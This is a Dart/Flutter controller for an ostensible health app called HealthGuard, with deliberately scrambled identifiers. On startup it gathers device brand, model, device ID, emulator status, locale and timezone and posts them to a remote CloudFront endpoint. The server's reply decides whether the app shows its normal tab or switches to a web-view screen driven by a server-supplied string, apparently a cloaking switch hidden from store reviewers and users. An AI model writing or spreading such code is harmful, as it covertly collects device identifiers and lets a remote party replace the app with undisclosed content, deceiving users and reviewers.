import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class HealthGuardTidyLogic extends GetxController {

  var feoamdlv = RxBool(false);
  var bclwnhgxkf = RxBool(true);
  var codbtxvj = RxString("");
  var kxfjwc = RxBool(false);
  var vfwjskq = RxBool(true);
  final byxzudcars = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    octv();
  }


  Future<void> octv() async {
    kxfjwc.value = true;
    vfwjskq.value = true;
    bclwnhgxkf.value = false;

    byxzudcars.post("https://ddwhox6t4lfon.cloudfront.net/lyq5n",data: await tyfenqlrx()).then((value) {
      var mzulifbc = value.data["mzulifbc"] as String;
      var efjbaw = value.data["efjbaw"] as bool;
      if (efjbaw) {
        codbtxvj.value = mzulifbc;
        lmkig();
      } else {
        slxngeqb();
      }
    }).catchError((e) {
      bclwnhgxkf.value = true;
      vfwjskq.value = true;
      kxfjwc.value = false;
    });
  }

  Future<Map<String, dynamic>> tyfenqlrx() async {
    final DeviceInfoPlugin epyn = DeviceInfoPlugin();
    PackageInfo hoejf_iezrfdx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var yqpouml = Platform.localeName;
    var YLETNAch = currentTimeZone;

    var tWOk = hoejf_iezrfdx.packageName;
    var YyRK = hoejf_iezrfdx.version;
    var BMhLkoxt = hoejf_iezrfdx.buildNumber;

    var ymtkGfsa = hoejf_iezrfdx.appName;
    var TMxdbzBj = "";
    var XPfDnmKq  = "";
    var GbSX = "";
    var mizksqob = "";
    var tuvsd = "";
    var gkqdu = "";
    var fwhuzxy = "";


    var STQNhRso = "";
    var cLdrMBp = false;

    if (GetPlatform.isAndroid) {
      STQNhRso = "android";
      var tdkvbl = await epyn.androidInfo;

      GbSX = tdkvbl.brand;

      TMxdbzBj  = tdkvbl.model;
      XPfDnmKq = tdkvbl.id;

      cLdrMBp = tdkvbl.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      STQNhRso = "ios";
      var ofwytlp = await epyn.iosInfo;
      GbSX = ofwytlp.name;
      TMxdbzBj = ofwytlp.model;

      XPfDnmKq = ofwytlp.identifierForVendor ?? "";
      cLdrMBp  = ofwytlp.isPhysicalDevice;
    }
    var res = {
      "ymtkGfsa": ymtkGfsa,
      "YyRK": YyRK,
      "tWOk": tWOk,
      "TMxdbzBj": TMxdbzBj,
      "gkqdu" : gkqdu,
      "YLETNAch": YLETNAch,
      "GbSX": GbSX,
      "XPfDnmKq": XPfDnmKq,
      "yqpouml": yqpouml,
      "STQNhRso": STQNhRso,
      "cLdrMBp": cLdrMBp,
      "mizksqob" : mizksqob,
      "BMhLkoxt": BMhLkoxt,
      "tuvsd" : tuvsd,
      "fwhuzxy" : fwhuzxy,

    };
    return res;
  }

  Future<void> slxngeqb() async {
    Get.offNamed("/health_guard_tab");
  }

  Future<void> lmkig() async {
    Get.offNamed("/health_guard_watch");
  }

}
